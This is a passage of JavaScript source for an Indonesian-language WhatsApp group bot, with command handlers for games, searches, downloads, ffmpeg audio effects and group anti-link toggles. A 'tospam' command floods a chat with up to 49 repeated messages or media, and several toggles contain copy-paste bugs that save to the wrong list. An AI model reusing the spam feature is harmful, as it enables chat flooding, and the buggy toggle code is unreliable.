if (args.length < 1) return reply(`Penggunaan ${prefix}autorespon on/off`)
if (q === 'on'){
autovn = true
reply(`Berhasil mengaktifkan autovn`)
} else if (q === 'off'){
autovn = false
reply(`Berhasil menonaktifkan autovn`)
} else {
reply(mess.error.api)
}
break
case 'autotype':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args.length < 1) return reply(`Penggunaan ${prefix}autorespon on/off`)
if (q === 'on'){
autotype = true
reply(`Berhasil mengaktifkan autotype`)
} else if (q === 'off'){
autotype = false
reply(`Berhasil menonaktifkan autotype`)
} else {
reply(mess.error.api)
}
break
case 'autoread':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args.length < 1) return reply(`Penggunaan ${prefix}autorespon on/off`)
if (q === 'on'){
autoread = true
reply(`Berhasil mengaktifkan autoread`)
} else if (q === 'off'){
autoread = false
reply(`Berhasil menonaktifkan autoread`)
} else {
reply(mess.error.api)
}
break
        case 'test':
				case 'tes':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				runtime = process.uptime()
				reply(`- SUDAH AKTIF BWANG °w°\n${waktu(runtime)}`)
				break
				case 'tictactoe':
case 'ttt':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Tag Lawan Anda! ')
if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
id = from
gilir = player2
ky_ttt.push({player1,player2,id,angka,gilir})
kurr.sendMessage(from, `*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ketik ${prefix}delttc , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
break
                case 'delttt':
                case 'delttc':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Sukses')
break
				case 'getpp':
					anu = from
		if (`${anu}@s.whatsapp.net`) {
		try {
					ppimg = await kurr.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await kurr.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				kurr.sendMessage(from, buffer, image, {quoted: mek})
		} else {
		}
			  break
case 'mode':
buttonss = [{buttonId: `public`, buttonText: {displayText: 'PUBLIC👥'}, type: 1},{buttonId: `self`, buttonText: {displayText: 'SELF👤'}, type: 1}]
const buMess = {
    contentText: "SELF/PUBLIC",
    footerText: 'Silahkan Pilih Saah Satu',
    buttons: buttonss,
    headerType: 1
}
await kurr.sendMessage(from, buMess, MessageType.buttonsMessage, {quoted: ftrol})
break
				case 'public':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
			publik = true
				reply('Sukses mengubah mode self ke public')
			break
			case 'self':
			if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				publik = false
				reply('Sukses mengubah mode public ke self')
			break
		case 'gimage':
case 'googleimage':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
sticWait(from)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error Terkurri Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break
				case 'herolist':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
				case 'google':
case 'googlesearch':
case 'ggs':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
sticWait(from)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
case 'mediafire':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
if (Number(filesize) >= 30000) return reply(`*「 MEDIAFIRE DOWNLOAD 」*

*🏴‍☠️ Nama :* ${res[0].nama}
*🏴‍☠️ Ukuran :* ${res[0].size}
*🏴‍☠️ Link :* ${res[0].link}

_Maaf size melebihi batas maksimal, Silahkan klik link diatas_`)
sticWait(from)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `*「 MEDIAFIRE DOWNLOAD 」*

*Data Berhasil Didapatkan!*
\`\`\`🏴‍☠️ Nama : ${res[0].nama}\`\`\`
\`\`\`🏴‍☠️ Ukuran : ${res[0].size}\`\`\`
\`\`\`🏴‍☠️ Link : ${res[0].link}\`\`\`

_File sedang dikirim, Silahkan tunggu beberapa menit_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break
				case 'kalkulator':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				case 'translate':
				case 'ts':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					try{
					if ( args.length === 1 ){
						tekss = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
						translate(tekss, {client: 'gtx', to:args[0]})
						.then((res) =>{
							reply(res.text)
							}) 
						} else
			if(args.length > 0 ) {
				ngab = args.join(' ')
			teks = ngab.split(' ')[0];
			bhs = ngab.split(' ')[1];
			  translate(teks, {client: 'gtx', to:bhs})
			  .then((res) =>{
				  reply(res.text)
				  })
				}
			} catch (e){
				reply(mess.error.api)
			}
				  break
		case 'artimimpi':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/artimimpi?q=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
				case 'fancytext':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'lirik':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return reply('Judulnya?')
sticWait(from)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break
				case 'bilangangka':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'pantun':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'resepmasakan':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `❏ *${anu.results.title}*\n\n❏ Porsi : ${anu.results.servings}\n❏ Waktu : ${anu.results.times}\n❏ Kesulitan : ${anu.results.dificulty}\n❏ Pengguna : ${anu.results.author.user}\n❏ Tanggal Diterbitkan : ${anu.results.author.datePublished}\n❏ Deskripsi : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Bahan : ${anu.results.ingredient}\n❏ Langkah : ${anu.results.step}`
					sticWait(from)
					buff = await getBuffer(anu.results.thumb)
					kurr.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (args.length < 1) return reply('Usernamenya?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
					gstalk = `❏ *GITHUB STALK*\n\n❏ Name : ${anu.result.name}\n❏ Followers : ${anu.result.followers}\n❏ Following : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Type : ${anu.result.type}\n❏ Company : ${anu.result.company}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Created At : ${anu.result.created_at}\n❏ Updated At : ${anu.result.updated_at}\n❏ Twitter Username : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
					sticWait(from)
					buff = await getBuffer(anu.result.avatar_url)
					kurr.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 
					case 'infogempa':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					sticWait(from)
					buff = await getBuffer(anu.result.Map)
					kurr.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break 
				case 'dadu':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			kurr.sendMessage(from, damdu, sticker, {quoted: mek})
			break
				case 'robot':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await kurr.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
kurr.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await kurr.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					kurr.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await kurr.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
kurr.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
fs.unlinkSync(ran)
	})
break
case 'bass':                 
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					encmediao = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediao = await kurr.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediao} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediao)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						kurr.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
				break
case 'sider':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
infom = await kurr.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
case 'tospam':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  kurr.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  kurr.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await kurr.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  kurr.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await kurr.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  kurr.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await kurr.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  kurr.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	case 'halloween':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	if (!arg) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
   if (!arg) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
case 'matrix':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!arg) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
				break
				case 'googletxt':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!arg) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!arg) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!arg) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!arg) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
				case 'd':
				case 'del':
				case 'delete':
					kurr.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'ambil':
              if (!isOwner && !mek.key.fromMe) return sticOwner(from)
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await kurr.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    kurr.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
					fs.unlinkSync(meidia)
				})
				break
				case 'readmore':
			    	case 'more':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(mess.error.api)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
                    case 'delchat':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                kurr.modifyChat(from, ChatModification.delete)
                break
				case 'clearall':
                 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					anu = await kurr.chats.all()
					kurr.setMaxListeners(25)
					for (let _ of anu) {
					kurr.modifyChat(_.jid, 'clear')
					}
					reply('❬ 𝗦𝗨𝗞𝗦𝗘𝗦 ❭ ')
				break 
					case 'mute':
			    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
					case 'restart':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
reply(`_Restarting ShinChan Yucan_`)
exec(`cd &&  node index`)
sleep(4000)
reply('Sukses')
break
				case 'detikvn':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await kurr.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						kurr.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await kurr.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						kurr.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break
				case "antivirtex":
        	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return sticAdmin(from)
			if (!isBotGroupAdmins) return sticNotAdmin(from)
					if (args[0] === 'on') {
						if (isAntivirtex) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan fitur antivirtex')
						kurr.sendMessage(from, `ALLERT!!! Group ini sudah di pasang antivirtex\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
						if (!isAntivirtex) return reply('Sudah Mati Kak')
						var ini = antivirtex.indexOf(from)
						antivirtex.splice(ini, 1)
						fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antilink))
						reply('Sukses menonaktifkan fitur antivirtex')
					} else if (!c){
 anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
punten = [{buttonId: 'antivirtex off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antivirtex on', buttonText: {displayText: 'ON✔️'}, type: 1}]
const btnasu = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: punten,
    headerType: 1
}
await kurr.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
				case 'antiwame':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return sticAdmin(from)
			if (!isBotGroupAdmins) return sticNotAdmin(from)
					if (args[0] === 'on') {
						if (isAntiWame) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./database/antiwame.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan fitur antiwame')
						kurr.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti wa.me\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
						if (!isAntiWame) return reply('Sudah Mati Kak')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antiwame.json', JSON.stringify(antilink))
						reply('Sukses menonaktifkan fitur antiwame')
					} else if (!c){
 anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
punten = [{buttonId: 'antiwame off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antiwame on', buttonText: {displayText: 'ON✔️'}, type: 1}]
const btnasu = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: punten,
    headerType: 1
}
await kurr.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
				 case 'antilink':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return sticAdmin(from)
			if (!isBotGroupAdmins) return sticNotAdmin(from)
					if (args[0] === 'on') {
						if (isAntiLink) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan fitur antilink')
						kurr.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
						if (!isAntiLink) return reply('Sudah Mati Kak')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Sukses menonaktifkan fitur antilink')
					} else if (!c){
 anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
punten = [{buttonId: 'antilink off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antilink on', buttonText: {displayText: 'ON✔️'}, type: 1}]
const btnasu = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: punten,
    headerType: 1
}
await kurr.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
					case 'antibug':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
          if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return sticAdmin(from)
